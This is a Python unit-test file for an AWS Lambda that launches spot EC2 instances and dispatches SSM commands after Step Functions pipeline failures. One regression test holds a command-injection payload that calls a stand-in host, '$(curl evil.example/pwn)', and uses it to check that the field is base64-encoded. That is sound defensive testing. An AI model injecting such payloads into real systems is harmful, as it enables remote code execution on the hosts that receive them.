"""Unit tests for the synchronous SF-failure -> sf-watch-spot dispatcher.

Hermetic: ``nousergon_lib.ec2_spot`` and ``boto3`` are stubbed in sys.modules
BEFORE importing index (mirrors ci-watch-dispatcher/test_handler.py — index.py
itself imports the REAL nousergon_lib.spot_dispatch, which resolves its own
`from nousergon_lib import ec2_spot` / `import boto3` against these stubs).
Validates: a valid event launches a spot box and fires an async SSM command;
the on-demand fallback on spot capacity exhaustion; a total launch failure
(spot AND on-demand exhausted) returns a clean launched:false rather than
raising; the (cadence_slug, pipeline_name, run_date)-scoped concurrency lock;
a post-launch SSM-send failure terminates the box and returns launched:false;
a malformed event returns launched:false rather than raising; the kill-switch
short-circuit; and the cause-field base64 command-injection guard.
"""

from __future__ import annotations

import base64
import importlib
import os
import sys
import types

import pytest

sys.path.insert(0, os.path.dirname(__file__))
sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))


# ── Stub nousergon_lib.ec2_spot + boto3 before importing index ─────────────────
class _SpotLaunchError(Exception):
    pass


class _SpotCapacityExhausted(_SpotLaunchError):
    pass


def _install_stubs(launch_impl, boto_clients):
    ec2_spot_mod = types.ModuleType("nousergon_lib.ec2_spot")
    ec2_spot_mod.SpotLaunchError = _SpotLaunchError
    ec2_spot_mod.SpotCapacityExhausted = _SpotCapacityExhausted
    ec2_spot_mod.launch = launch_impl
    sys.modules["nousergon_lib.ec2_spot"] = ec2_spot_mod

    boto3_mod = types.ModuleType("boto3")
    boto3_mod.client = lambda name, **kw: boto_clients[name]
    sys.modules["boto3"] = boto3_mod


class _FakeWaiter:
    def wait(self, **kw):
        return None


class _FakeEc2:
    def __init__(self, running_instances=None):
        self.terminated = []
        self.tags_created = []
        # {(cadence_slug, pipeline_name, run_date) -> [instance_ids]} already
        # "live" for the concurrency guard's describe_instances check to find.
        self._running_instances = dict(running_instances or {})

    def get_waiter(self, name):
        return _FakeWaiter()

    def terminate_instances(self, InstanceIds):  # noqa: N803 — boto3 kwarg name
        self.terminated.extend(InstanceIds)
        return {"TerminatingInstances": [{"InstanceId": i} for i in InstanceIds]}

    def create_tags(self, Resources, Tags):  # noqa: N803 — boto3 kwarg names
        self.tags_created.append((Resources, Tags))
        return {}

    def describe_instances(self, Filters):  # noqa: N803 — boto3 kwarg name
        by_name = {f["Name"]: f["Values"] for f in Filters}
        cadence = by_name.get("tag:sf-watch-cadence", [None])[0]
        pipeline = by_name.get("tag:sf-watch-pipeline", [None])[0]
        run_date = by_name.get("tag:sf-watch-run-date", [None])[0]
        ids = self._running_instances.get((cadence, pipeline, run_date), [])
        return {"Reservations": [{"Instances": [{"InstanceId": i} for i in ids]}]} if ids else {"Reservations": []}


class _FakeSsm:
    def __init__(self):
        self.sent = []

    def describe_instance_information(self, **kw):
        return {"InstanceInformationList": [{"PingStatus": "Online"}]}

    def send_command(self, **kw):
        self.sent.append(kw)
        return {"Command": {"CommandId": "cmd-123"}}


def _load(monkeypatch, *, launch_impl=None, env=None, running_instances=None):
    for k, v in (env or {}).items():
        monkeypatch.setenv(k, v)
    ssm = _FakeSsm()
    ec2 = _FakeEc2(running_instances=running_instances)
    clients = {"ec2": ec2, "ssm": ssm}
    if launch_impl is None:
        launch_impl = lambda types_, subnets, **kw: "i-stub"  # noqa: E731
    _install_stubs(launch_impl, clients)
    # Derive the stub requirement from index.py's live import graph and fail
    # loud on drift here, rather than as a ModuleNotFoundError at deploy time
    # (config#1746 pattern — see ci-watch-dispatcher/test_handler.py).
    from _shared.hermetic_import_guard import assert_hermetic_imports_satisfied

    assert_hermetic_imports_satisfied(__file__)
    # nousergon_lib.spot_dispatch (config#2106) sits between index.py and the
    # stubbed nousergon_lib.ec2_spot/boto3 above. Its own `from nousergon_lib
    # import ec2_spot` / `import boto3` bindings are resolved once at ITS
    # import time — reload it in place (never a bare del+reimport — see
    # reference_pytest_del_reimport_vs_reload_fixture_corruption_260709) so
    # every test sees the CURRENT stub.
    if "nousergon_lib.spot_dispatch" in sys.modules:
        importlib.reload(sys.modules["nousergon_lib.spot_dispatch"])
    else:
        import nousergon_lib.spot_dispatch  # noqa: F401 — first import picks up the current stub

    import index

    importlib.reload(index)
    index._test_ssm = ssm  # expose for assertions
    index._test_ec2 = ec2
    return index


def _event(**overrides):
    base = {
        "pipeline_name": "ne-weekly-freshness-pipeline",
        "cadence_slug": "saturday",
        "state_machine_arn": "arn:aws:states:us-east-1:711398986525:stateMachine:ne-weekly-freshness-pipeline",
        "execution_arn": "arn:aws:states:us-east-1:711398986525:execution:ne-weekly-freshness-pipeline:run-1",
        "run_date": "2026-07-11",
        "failed_state": "RationaleClustering",
        "cause": "States.Timeout",
        "watch_log_key": "consolidated/saturday_sf_watch/2026-07-11.json",
        "is_preflight": "false",
    }
    base.update(overrides)
    return base


def test_valid_event_launches_spot_and_sends_async_ssm(monkeypatch):
    calls = {}

    def _launch(types_, subnets, **kw):
        calls["spot"] = kw.get("spot")
        calls["profile"] = kw.get("iam_instance_profile")
        calls["tag_name"] = kw.get("tag_name")
        return "i-abc"

    idx = _load(monkeypatch, launch_impl=_launch, env={"SF_WATCH_DISPATCH_ENABLED": "true"})
    out = idx.handler(_event(), None)
    assert out["launched"] is True
    assert out["reason"] == "launched"
    assert out["instance_id"] == "i-abc"
    assert out["market"] == "spot"
    assert out["command_id"] == "cmd-123"
    assert out["pipeline_name"] == "ne-weekly-freshness-pipeline"
    assert out["cadence_slug"] == "saturday"
    assert out["run_date"] == "2026-07-11"
    assert calls["spot"] is True
    assert calls["profile"] == "alpha-engine-sf-watch-executor-profile"
    assert calls["tag_name"] == "alpha-engine-sf-watch-spot"
    # The instance is tagged with its cadence/pipeline/run_date for the
    # concurrency guard AND the fleet spot-orphan-reaper's completion check.
    assert idx._test_ec2.tags_created == [
        (["i-abc"], [
            {"Key": "sf-watch-cadence", "Value": "saturday"},
            {"Key": "sf-watch-pipeline", "Value": "ne-weekly-freshness-pipeline"},
            {"Key": "sf-watch-run-date", "Value": "2026-07-11"},
        ])
    ]
    sent = idx._test_ssm.sent[0]
    cmd = sent["Parameters"]["commands"][0]
    # sf_watch_spot_bootstrap.sh (alpha-engine-config) takes its SF fields as
    # CLI FLAGS, not env vars.
    assert "exec bash infrastructure/sf_watch_spot_bootstrap.sh" in cmd
    assert '--pipeline "ne-weekly-freshness-pipeline"' in cmd
    assert '--cadence-slug "saturday"' in cmd
    assert '--execution-arn "arn:aws:states:us-east-1:711398986525:execution:ne-weekly-freshness-pipeline:run-1"' in cmd
    assert '--run-date "2026-07-11"' in cmd
    assert '--failed-state "RationaleClustering"' in cmd
    assert '--watch-log-key "consolidated/saturday_sf_watch/2026-07-11.json"' in cmd
    assert '--is-preflight "false"' in cmd
    assert "export HOME=/root" in cmd
    # cause is base64-encoded, never raw, in the constructed shell command.
    expected_b64 = base64.b64encode(b"States.Timeout").decode("ascii")
    assert f'--cause-b64 "{expected_b64}"' in cmd
    assert "States.Timeout" not in cmd
    # run_token is NOT threaded into the box (no in-box consumer — the
    # completion marker keys directly on cadence/pipeline/run_date) — only a
    # Lambda-side correlation id, surfaced via the SSM Comment field instead.
    assert "run_token" not in cmd
    assert "token" in sent["Comment"]

    assert sent["Parameters"]["executionTimeout"] == [str(idx.MAX_RUNTIME_SECONDS)]


def test_cause_with_shell_metacharacters_is_safely_base64_encoded(monkeypatch):
    """Security regression guard: a `cause` string containing quotes/`$`/
    backticks must NEVER be interpolated raw into the constructed SSM shell
    command — only its base64 encoding may appear."""
    dangerous_cause = '$(curl evil.example/pwn); `whoami`; "quoted"; \' single \''
    idx = _load(monkeypatch, env={"SF_WATCH_DISPATCH_ENABLED": "true"})
    out = idx.handler(_event(cause=dangerous_cause), None)
    assert out["launched"] is True
    cmd = idx._test_ssm.sent[0]["Parameters"]["commands"][0]
    assert dangerous_cause not in cmd
    assert "curl evil.example" not in cmd
    assert "whoami" not in cmd
    expected_b64 = base64.b64encode(dangerous_cause.encode("utf-8")).decode("ascii")
    assert f'--cause-b64 "{expected_b64}"' in cmd


def test_on_demand_fallback_on_spot_capacity_exhaustion(monkeypatch):
    seen = []

    def _launch(types_, subnets, **kw):
        seen.append(kw.get("spot"))
        if kw.get("spot"):
            raise _SpotCapacityExhausted("no capacity in any pool")
        return "i-ondemand"

    idx = _load(monkeypatch, launch_impl=_launch, env={"SF_WATCH_DISPATCH_ENABLED": "true"})
    out = idx.handler(_event(), None)
    assert out["launched"] is True
    assert out["market"] == "on-demand"
    assert out["instance_id"] == "i-ondemand"
    assert seen == [True, False]  # tried spot, then on-demand


def test_total_launch_exhaustion_returns_clean_false_not_raise(monkeypatch):
    # SYNCHRONOUS contract (index.py docstring): spot AND on-demand both
    # exhausted must be a clean return, not an exception — the GHA caller
    # needs a JSON verdict to branch on.
    def _launch(types_, subnets, **kw):
        raise _SpotCapacityExhausted("exhausted everywhere")

    idx = _load(monkeypatch, launch_impl=_launch, env={"SF_WATCH_DISPATCH_ENABLED": "true"})
    out = idx.handler(_event(), None)
    assert out["launched"] is False
    assert out["reason"] == "launch_failed"
    assert "exhausted everywhere" in out["error"]
    assert idx._test_ssm.sent == []


def test_non_capacity_launch_error_returns_clean_false(monkeypatch):
    def _launch(types_, subnets, **kw):
        raise _SpotLaunchError("RunInstances denied")

    idx = _load(monkeypatch, launch_impl=_launch, env={"SF_WATCH_DISPATCH_ENABLED": "true"})
    out = idx.handler(_event(), None)
    assert out["launched"] is False
    assert out["reason"] == "launch_failed"


def test_concurrency_skip_when_same_cadence_pipeline_run_date_already_running(monkeypatch):
    launched = []

    def _launch(types_, subnets, **kw):
        launched.append(True)
        return "i-new"

    idx = _load(
        monkeypatch, launch_impl=_launch, env={"SF_WATCH_DISPATCH_ENABLED": "true"},
        running_instances={
            ("saturday", "ne-weekly-freshness-pipeline", "2026-07-11"): ["i-already-running"],
        },
    )
    out = idx.handler(_event(), None)
    assert out["launched"] is False
    assert out["reason"] == "concurrent_skip"
    assert out["existing_instance_ids"] == ["i-already-running"]
    assert launched == []  # never even attempted a spot launch — zero spend


def test_different_run_date_same_pipeline_cadence_is_not_blocked(monkeypatch):
    # This is the whole point of the full (cadence, pipeline, run_date)
    # granularity — a partial-key lock would wrongly starve a second
    # independent failure for a different run_date.
    idx = _load(
        monkeypatch, launch_impl=lambda types_, subnets, **kw: "i-new",  # noqa: E731
        env={"SF_WATCH_DISPATCH_ENABLED": "true"},
        running_instances={
            ("saturday", "ne-weekly-freshness-pipeline", "2026-07-04"): ["i-other-date"],
        },
    )
    out = idx.handler(_event(run_date="2026-07-11"), None)
    assert out["launched"] is True
    assert out["instance_id"] == "i-new"


def test_different_pipeline_same_cadence_and_date_is_not_blocked(monkeypatch):
    idx = _load(
        monkeypatch, launch_impl=lambda types_, subnets, **kw: "i-new",  # noqa: E731
        env={"SF_WATCH_DISPATCH_ENABLED": "true"},
        running_instances={
            ("saturday", "ne-preopen-trading-pipeline", "2026-07-11"): ["i-other-pipeline"],
        },
    )
    out = idx.handler(_event(), None)
    assert out["launched"] is True


def test_concurrency_check_fails_safe_and_still_launches(monkeypatch):
    idx = _load(
        monkeypatch, launch_impl=lambda types_, subnets, **kw: "i-new",  # noqa: E731
        env={"SF_WATCH_DISPATCH_ENABLED": "true"},
    )

    def _boom(Filters):  # noqa: N803 — boto3 kwarg name
        raise RuntimeError("EC2 API hiccup")

    idx._test_ec2.describe_instances = _boom
    out = idx.handler(_event(), None)
    # A broken check must never block a launch — optimization, not a
    # correctness gate.
    assert out["launched"] is True


def test_post_launch_ssm_failure_terminates_instance_returns_clean_false(monkeypatch):
    idx = _load(
        monkeypatch,
        launch_impl=lambda types_, subnets, **kw: "i-orphan",  # noqa: E731
        env={"SF_WATCH_DISPATCH_ENABLED": "true"},
    )

    def _boom_send(**kw):
        raise RuntimeError("SSM SendCommand failed")

    idx._test_ssm.send_command = _boom_send
    out = idx.handler(_event(), None)
    assert out["launched"] is False
    assert out["reason"] == "post_launch_failed"
    assert out["instance_id"] == "i-orphan"
    # The just-launched box was terminated (not orphaned), and the handler
    # still returned a clean result instead of raising.
    assert idx._test_ec2.terminated == ["i-orphan"]


def test_malformed_run_date_returns_clean_false_not_raise(monkeypatch):
    idx = _load(monkeypatch, env={"SF_WATCH_DISPATCH_ENABLED": "true"})
    out = idx.handler(_event(run_date="not-a-date"), None)
    assert out["launched"] is False
    assert out["reason"] == "invalid_event"
    assert idx._test_ssm.sent == []


def test_malformed_execution_arn_returns_clean_false(monkeypatch):
    idx = _load(monkeypatch, env={"SF_WATCH_DISPATCH_ENABLED": "true"})
    out = idx.handler(_event(execution_arn="not-an-arn"), None)
    assert out["launched"] is False
    assert out["reason"] == "invalid_event"


def test_missing_pipeline_name_returns_clean_false(monkeypatch):
    idx = _load(monkeypatch, env={"SF_WATCH_DISPATCH_ENABLED": "true"})
    event = _event()
    del event["pipeline_name"]
    out = idx.handler(event, None)
    assert out["launched"] is False
    assert out["reason"] == "invalid_event"


def test_missing_optional_fields_still_launches(monkeypatch):
    # failed_state/cause/watch_log_key/state_machine_arn/is_preflight are all
    # optional — only pipeline_name/cadence_slug/execution_arn/run_date are
    # required (mirrors sf_watch_spot_bootstrap.sh's own FATAL check).
    idx = _load(monkeypatch, env={"SF_WATCH_DISPATCH_ENABLED": "true"})
    event = _event()
    for optional in ("state_machine_arn", "failed_state", "cause", "watch_log_key", "is_preflight"):
        del event[optional]
    out = idx.handler(event, None)
    assert out["launched"] is True


def test_disabled_flag_short_circuits(monkeypatch):
    idx = _load(monkeypatch, env={"SF_WATCH_DISPATCH_ENABLED": "false"})
    out = idx.handler(_event(), None)
    assert out["launched"] is False
    assert out["reason"] == "disabled"
    assert idx._test_ssm.sent == []
